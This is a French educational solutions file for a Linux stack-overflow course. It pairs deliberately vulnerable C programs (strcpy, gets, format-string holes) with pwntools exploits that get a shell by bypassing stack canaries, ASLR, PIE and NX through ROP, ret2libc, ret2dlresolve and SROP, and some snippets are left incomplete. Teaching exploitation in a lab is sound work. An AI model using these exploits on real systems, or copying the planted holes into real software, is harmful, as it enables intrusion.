# Solutions - Stack Overflow Linux

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre les techniques d'exploitation stack overflow. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre le stack overflow basique et écraser l'adresse de retour

### Solution

```c
/*
 * Stack Overflow Basique
 *
 * Compilation (SANS protections) :
 * gcc -fno-stack-protector -z execstack -no-pie stack_basic.c -o stack_basic
 */

#include <stdio.h>
#include <string.h>

// Fonction qu'on ne peut normalement pas atteindre
void secret_function()
{
    printf("\n[!!!] SECRET FUNCTION CALLED!\n");
    printf("[+] You successfully hijacked the control flow!\n");
    printf("[+] Here's your shell:\n\n");
    system("/bin/sh");
}

// Fonction vulnérable
void vulnerable_function(char *input)
{
    char buffer[64];  // Buffer de 64 bytes

    printf("[*] Buffer address: %p\n", buffer);
    printf("[*] Input length: %ld\n", strlen(input));

    // VULNÉRABILITÉ : pas de vérification de longueur
    strcpy(buffer, input);

    printf("[+] Data copied successfully\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("\n[*] Hints:\n");
        printf("  - Buffer size: 64 bytes\n");
        printf("  - You need to overflow to overwrite return address\n");
        printf("  - Secret function at: %p\n", secret_function);
        return 1;
    }

    printf("[*] === Stack Overflow Challenge ===\n");
    printf("[*] Secret function address: %p\n\n", secret_function);

    vulnerable_function(argv[1]);

    printf("[*] Returned normally\n");
    return 0;
}
```

**Exploitation manuelle** :

```bash
# 1. Trouver l'adresse de secret_function
objdump -d stack_basic | grep secret_function
# Exemple : 0000000000401156 <secret_function>

# 2. Calculer l'offset
# Buffer = 64 bytes
# Saved RBP = 8 bytes
# Total offset = 72 bytes

# 3. Créer le payload
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x56\x11\x40\x00\x00\x00\x00\x00')" > payload

# 4. Exploiter
./stack_basic $(cat payload)
```

**Script Python avec pwntools** :

```python
#!/usr/bin/env python3
"""
Exploit basique de stack overflow
"""

from pwn import *

# Configuration
binary = "./stack_basic"
elf = ELF(binary)

# Trouve l'adresse de secret_function
secret_addr = elf.symbols['secret_function']
print(f"[*] Secret function at: 0x{secret_addr:x}")

# Calcul de l'offset
# Buffer = 64 bytes, RBP = 8 bytes
offset = 72

# Construction du payload
payload = b'A' * offset
payload += p64(secret_addr)

print(f"[*] Payload size: {len(payload)} bytes")

# Lancement
p = process([binary, payload])

# Mode interactif pour le shell
p.interactive()
```

**Explications** :

1. **Organisation de la pile** :
   ```
   +------------------+ <- Haute adresse
   | Return address   | <- Ce qu'on veut écraser
   +------------------+
   | Saved RBP        |
   +------------------+
   | buffer[64]       |
   +------------------+ <- Basse adresse
   ```

2. **Overflow** :
   - strcpy copie jusqu'au null byte
   - Déborde du buffer
   - Écrase saved RBP puis return address

3. **Redirection** :
   - Return address modifiée = secret_function
   - Quand vulnerable_function retourne, saute à secret_function

---

## Exercice 2 : Modification (Facile)

**Objectif** : Bypass du stack canary avec info leak

### Solution

```c
/*
 * Stack Overflow avec Canary
 *
 * Compilation (AVEC canary) :
 * gcc -fstack-protector-all -z execstack -no-pie stack_canary.c -o stack_canary
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win()
{
    printf("[+] Win function!\n");
    system("/bin/sh");
}

void leak_canary()
{
    char buffer[64];
    int i;

    printf("[*] Enter data: ");
    fgets(buffer, sizeof(buffer), stdin);

    // Vulnérabilité : affiche le buffer sans vérification
    printf("[*] You entered: ");
    printf(buffer);  // Format string vulnerability!

    printf("\n[*] Buffer dump:\n");
    for (i = 0; i < 80; i++) {  // Leak au-delà du buffer
        printf("%02x ", (unsigned char)buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

void vulnerable()
{
    char buffer[64];

    printf("\n[*] Enter exploit: ");
    gets(buffer);  // Buffer overflow
}

int main()
{
    printf("[*] Stack Canary Bypass Challenge\n");
    printf("[*] Win function at: %p\n\n", win);

    // Permet de leaker le canary
    leak_canary();

    // Exploitation avec le canary connu
    vulnerable();

    return 0;
}
```

**Exploit avec leak** :

```python
#!/usr/bin/env python3
"""
Bypass stack canary via info leak
"""

from pwn import *

context.arch = 'amd64'

binary = "./stack_canary"
elf = ELF(binary)

# Lancement
p = process(binary)

# === ÉTAPE 1 : LEAK DU CANARY ===
print("[*] Step 1: Leaking canary")

# Utilise la format string pour leaker la pile
# %11$p pour leaker le canary (offset à ajuster)
p.sendlineafter(b'Enter data: ', b'%11$p.%12$p.%13$p')

# Récupère le leak
leak = p.recvline()
print(f"[*] Leak: {leak}")

# Parse le canary
leaks = leak.split(b'.')
canary = int(leaks[0].strip(), 16)

print(f"[+] Canary leaked: 0x{canary:x}")

# Attend le dump
p.recvuntil(b'Buffer dump:\n')
dump = p.recvuntil(b'Enter exploit:')

# === ÉTAPE 2 : EXPLOITATION ===
print("\n[*] Step 2: Exploitation with known canary")

win_addr = elf.symbols['win']
offset = 64  # Buffer
padding = 8  # Saved RBP

payload = b'A' * offset
payload += p64(canary)  # Restaure le canary original
payload += b'B' * padding
payload += p64(win_addr)

print(f"[*] Payload size: {len(payload)} bytes")
print(f"[*] Win address: 0x{win_addr:x}")

p.sendline(payload)

# Shell
p.interactive()
```

**Alternative : Bruteforce du canary** :

```python
#!/usr/bin/env python3
"""
Bruteforce du canary byte par byte
(fonctionne si le processus fork sans réinitialiser le canary)
"""

from pwn import *
import string

context.log_level = 'error'

binary = "./stack_canary"

def check_canary_byte(known_canary, test_byte):
    """Teste un byte du canary"""
    p = process(binary)

    # Skip le leak
    p.sendlineafter(b'Enter data: ', b'A')
    p.recvuntil(b'Enter exploit:')

    # Payload : overflow jusqu'au canary + bytes connus + test byte
    payload = b'A' * 64
    payload += known_canary + bytes([test_byte])

    p.sendline(payload)

    try:
        output = p.recvall(timeout=1)
        # Si pas de "stack smashing detected", le byte est bon
        if b"stack smashing detected" not in output:
            p.close()
            return True
    except:
        pass

    p.close()
    return False

def bruteforce_canary():
    """Bruteforce le canary byte par byte"""
    canary = b'\x00'  # Le canary commence toujours par \x00

    print("[*] Bruteforcing canary...")

    for byte_pos in range(1, 8):
        print(f"[*] Bruteforcing byte {byte_pos}/7")

        for test in range(256):
            if check_canary_byte(canary, test):
                canary += bytes([test])
                print(f"  [+] Found byte {byte_pos}: 0x{test:02x}")
                print(f"  [*] Canary so far: {canary.hex()}")
                break

        if len(canary) != byte_pos + 1:
            print("  [-] Failed to find byte")
            return None

    print(f"\n[+] Complete canary: 0x{u64(canary):x}")
    return canary

# Bruteforce
canary = bruteforce_canary()

if canary:
    # Exploitation avec le canary
    print("\n[*] Exploiting with bruteforced canary...")
    p = process(binary)
    # ... rest of exploit
```

**Explications** :

1. **Stack Canary** :
   - Valeur aléatoire placée entre buffer et return address
   - Vérifié avant le return
   - Si modifié : abort avec "stack smashing detected"

2. **Organisation de la pile avec canary** :
   ```
   +------------------+
   | Return address   |
   +------------------+
   | Saved RBP        |
   +------------------+
   | CANARY           | <- Valeur à préserver
   +------------------+
   | buffer[64]       |
   +------------------+
   ```

3. **Bypass techniques** :
   - Info leak : lire le canary via vulnérabilité
   - Bruteforce : tester byte par byte (si fork)
   - Overwrite partiel : ne pas toucher au canary

---

## Exercice 3 : Création (Moyen)

**Objectif** : Exploitation avec ASLR activé via ROP

### Solution

```c
/*
 * Stack Overflow avec NX + ASLR
 *
 * Compilation :
 * gcc -fno-stack-protector stack_aslr.c -o stack_aslr
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vulnerable()
{
    char buffer[128];
    char *heap_var = malloc(32);

    // Info leak
    printf("[*] puts@GOT: %p\n", puts);
    printf("[*] Buffer: %p\n", buffer);
    printf("[*] Heap: %p\n", heap_var);

    printf("\n[*] Enter data: ");
    gets(buffer);

    free(heap_var);
}

int main()
{
    printf("[*] Stack Overflow + ASLR Challenge\n");
    printf("====================================\n\n");

    vulnerable();

    printf("[*] Returned normally\n");
    return 0;
}
```

**Exploit ret2libc avec leak** :

```python
#!/usr/bin/env python3
"""
Exploitation avec ASLR via ret2libc
Nécessite un leak de la libc
"""

from pwn import *

context.arch = 'amd64'

binary = "./stack_aslr"
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# === PREMIER RUN : LEAK ===
print("[*] Step 1: Leaking libc address")

p = process(binary)

# Récupère le leak de puts
p.recvuntil(b'puts@GOT: ')
puts_leak = int(p.recvline().strip(), 16)

print(f"[+] puts() leaked: 0x{puts_leak:x}")

# Calcule la base de la libc
libc_base = puts_leak - libc.symbols['puts']
print(f"[+] libc base: 0x{libc_base:x}")

# Calcule les adresses nécessaires
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
exit_addr = libc_base + libc.symbols['exit']

print(f"[+] system(): 0x{system_addr:x}")
print(f"[+] /bin/sh: 0x{binsh_addr:x}")
print(f"[+] exit(): 0x{exit_addr:x}")

# === ÉTAPE 2 : EXPLOITATION ===
print("\n[*] Step 2: Building ROP chain")

# Trouve les gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print(f"[*] pop rdi; ret @ 0x{pop_rdi:x}")
print(f"[*] ret @ 0x{ret:x}")

# Construction du payload
offset = 136

payload = b'A' * offset
payload += p64(ret)  # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

print(f"\n[*] Sending payload ({len(payload)} bytes)")

p.sendline(payload)

# Shell
print("[+] Shell should spawn...")
p.interactive()
```

**Version avec leak multiple pour ASLR + PIE** :

```python
#!/usr/bin/env python3
"""
Exploitation avec PIE + ASLR
Nécessite leak de code ET libc
"""

from pwn import *

context.arch = 'amd64'

binary = "./stack_aslr"

# === PREMIÈRE ÉTAPE : LEAK DU BINAIRE ===
print("[*] Stage 1: Leaking binary base")

p = process(binary)

# Si on a une vulnérabilité format string ou un leak dans le binaire
# On peut leaker une adresse de code pour calculer la base

# Exemple avec format string
p.sendlineafter(b'data: ', b'%3$p')
code_leak = int(p.recvline().strip(), 16)

# Calcule la base (offset dépend de quelle fonction a leaké)
binary_base = code_leak - 0x1234  # Offset à ajuster

print(f"[+] Binary base: 0x{binary_base:x}")

# === DEUXIÈME ÉTAPE : LEAK LIBC ===
# (comme précédemment)

# === TROISIÈME ÉTAPE : EXPLOITATION ===
# Utilise les adresses calculées
```

**Explications** :

1. **ASLR** :
   - Randomise les adresses de la stack, heap, libc, code (si PIE)
   - Nécessite un leak pour calculer les vraies adresses
   - Les offsets relatifs restent constants

2. **Ret2libc** :
   - Au lieu de shellcode, appelle system() de la libc
   - Bypass NX (stack non-exécutable)
   - Nécessite l'adresse de system() et "/bin/sh"

3. **Information Leak** :
   - Leak d'une adresse connue (puts, __libc_start_main, etc.)
   - Calcul de la base : leaked_addr - offset_in_lib
   - Calcul des autres adresses : base + offset

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : Exploitation complète avec toutes les protections (PIE + ASLR + NX + Canary)

### Solution

```c
/*
 * Stack Overflow - Toutes protections
 *
 * Compilation :
 * gcc -fstack-protector-all -fpie -pie stack_full.c -o stack_full
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Fonction avec vulnérabilité format string
void info_leak()
{
    char buffer[128];

    printf("[*] Debug info:\n");
    printf("  Stack: %p\n", &buffer);
    printf("  Code: %p\n", info_leak);
    printf("  Libc: %p\n", printf);

    printf("\n[*] Enter format: ");
    fgets(buffer, sizeof(buffer), stdin);

    // Format string vulnerability
    printf("[*] Output: ");
    printf(buffer);
    printf("\n");
}

void vulnerable()
{
    char buffer[256];

    printf("\n[*] Enter exploit: ");
    read(0, buffer, 512);  // Overflow!

    printf("[*] Data received\n");
}

int main()
{
    printf("[*] Full Protection Challenge\n");
    printf("==============================\n\n");
    printf("[*] PIE + ASLR + NX + Canary + RELRO\n\n");

    // Setup
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    // Leak phase
    info_leak();

    // Exploit phase
    vulnerable();

    return 0;
}
```

**Exploit complet multi-étapes** :

```python
#!/usr/bin/env python3
"""
Exploit avec toutes les protections

Stratégie :
1. Format string pour leak canary + libc + code
2. ROP chain avec addresses calculées
3. Bypass du canary avec la valeur leakée
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = "./stack_full"
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# === ÉTAPE 1 : LEAKS VIA FORMAT STRING ===
print("[*] === STAGE 1: Information Leaks ===")

# Les leaks naturels
p.recvuntil(b'Stack: ')
stack_leak = int(p.recvline().strip(), 16)

p.recvuntil(b'Code: ')
code_leak = int(p.recvline().strip(), 16)

p.recvuntil(b'Libc: ')
libc_leak = int(p.recvline().strip(), 16)

print(f"[+] Stack leak: 0x{stack_leak:x}")
print(f"[+] Code leak: 0x{code_leak:x}")
print(f"[+] Libc leak: 0x{libc_leak:x}")

# Calcule les bases
binary_base = code_leak - elf.symbols['info_leak']
libc_base = libc_leak - libc.symbols['printf']

print(f"[+] Binary base: 0x{binary_base:x}")
print(f"[+] Libc base: 0x{libc_base:x}")

# Format string pour leaker le canary
# Le canary est sur la pile, on utilise %N$p pour y accéder
# Offset à trouver par fuzzing

p.sendlineafter(b'format: ', b'%13$p.%15$p.%17$p')
leaks = p.recvline().split(b'.')

# Parse les leaks
canary = int(leaks[0].strip(), 16)

print(f"[+] Canary leaked: 0x{canary:x}")

# === ÉTAPE 2 : CALCUL DES ADRESSES ===
print("\n[*] === STAGE 2: Calculating addresses ===")

# Gadgets dans le binaire (avec base)
try:
    elf.address = binary_base
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
except:
    # Si pas de gadgets, chercher dans libc
    libc.address = libc_base
    rop_libc = ROP(libc)
    pop_rdi = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
    ret = libc_base + rop_libc.find_gadget(['ret'])[0]

# Adresses libc
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

print(f"[*] pop rdi; ret: 0x{pop_rdi:x}")
print(f"[*] ret: 0x{ret:x}")
print(f"[*] system(): 0x{system_addr:x}")
print(f"[*] /bin/sh: 0x{binsh_addr:x}")

# === ÉTAPE 3 : CONSTRUCTION DU PAYLOAD ===
print("\n[*] === STAGE 3: Building payload ===")

offset = 256  # Buffer size
canary_offset = 8  # Padding jusqu'au canary

payload = b'A' * offset
payload += p64(canary)  # Restaure le canary original !
payload += b'B' * 8     # Saved RBP
payload += p64(ret)     # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

print(f"[*] Payload size: {len(payload)} bytes")

# === ÉTAPE 4 : EXPLOITATION ===
print("\n[*] === STAGE 4: Exploitation ===")

p.sendafter(b'exploit: ', payload)

print("[+] Payload sent!")
print("[+] Shell should spawn...\n")

p.interactive()
```

**Technique avancée : ret2dlresolve** :

```python
#!/usr/bin/env python3
"""
ret2dlresolve : résout system() dynamiquement
Utile quand on ne peut pas leaker la libc
"""

from pwn import *

context.arch = 'amd64'

binary = "./stack_full"
elf = ELF(binary)

p = process(binary)

# Skip les leaks
p.recvuntil(b'format: ')
p.sendline(b'AAAA')

# Construit la payload ret2dlresolve
# Cette technique est complexe et nécessite :
# 1. Contrôle de la GOT
# 2. Forge une fausse structure de résolution
# 3. Appel à _dl_runtime_resolve

# Voir : https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/ret2dlresolve.py

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.ret2dlresolve(dlresolve)

payload = rop.chain()

p.sendafter(b'exploit: ', payload)
p.interactive()
```

**Technique SROP (Sigreturn-Oriented Programming)** :

```python
#!/usr/bin/env python3
"""
SROP : utilise sigreturn pour contrôler tous les registres
"""

from pwn import *

context.arch = 'amd64'

binary = "./stack_full"
elf = ELF(binary)

# Trouve un gadget syscall
syscall_gadget = 0x...  # À trouver avec ROPgadget

# Construit une sigreturn frame
frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = stack_addr  # Pointeur vers "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget

# ROP chain
pop_rax = 0x...  # pop rax; ret

payload = b'A' * offset
payload += p64(canary)
payload += b'B' * 8
payload += p64(pop_rax)
payload += p64(15)  # __NR_rt_sigreturn
payload += p64(syscall_gadget)
payload += bytes(frame)

# Envoie
p.sendafter(b'exploit: ', payload)
p.interactive()
```

**Explications avancées** :

1. **Multi-stage exploitation** :
   - Stage 1 : Information gathering (leaks)
   - Stage 2 : Address calculation
   - Stage 3 : Payload construction
   - Stage 4 : Exploitation

2. **Bypass complet** :
   - Canary : leak via format string + restauration
   - ASLR/PIE : leak + calcul de base
   - NX : ROP au lieu de shellcode
   - RELRO : ret2libc au lieu de GOT overwrite

3. **Techniques alternatives** :
   - ret2dlresolve : quand pas de leak libc possible
   - SROP : quand peu de gadgets disponibles
   - Stack pivot : quand buffer trop petit

4. **Détection et prévention** :
   - CFI (Control Flow Integrity)
   - CET (Control-flow Enforcement Technology)
   - Shadow stack
   - Hardened allocators

---

## Points clés à retenir

1. **Protections modernes** :
   - Stack Canary : détection de corruption
   - NX : pile non-exécutable
   - ASLR/PIE : randomisation des adresses
   - RELRO : protection de la GOT

2. **Techniques de bypass** :
   - Information leak pour ASLR
   - ROP pour NX
   - Canary leak et restauration
   - Multiple stages d'exploitation

3. **Outils essentiels** :
   - pwntools pour automatisation
   - gdb + pwndbg pour debug
   - ROPgadget pour gadgets
   - checksec pour vérifier les protections

4. **Exploitation moderne** :
   - Nécessite souvent plusieurs vulnérabilités
   - Approche multi-étapes
   - Combinaison de techniques
   - Adaptation aux protections

## Ressources complémentaires

- Modern Binary Exploitation (RPISEC)
- LiveOverflow Binary Exploitation series
- pwnable.kr et pwnable.tw
- CTF write-ups sur stack exploitation
- Linux kernel exploitation (si applicable)
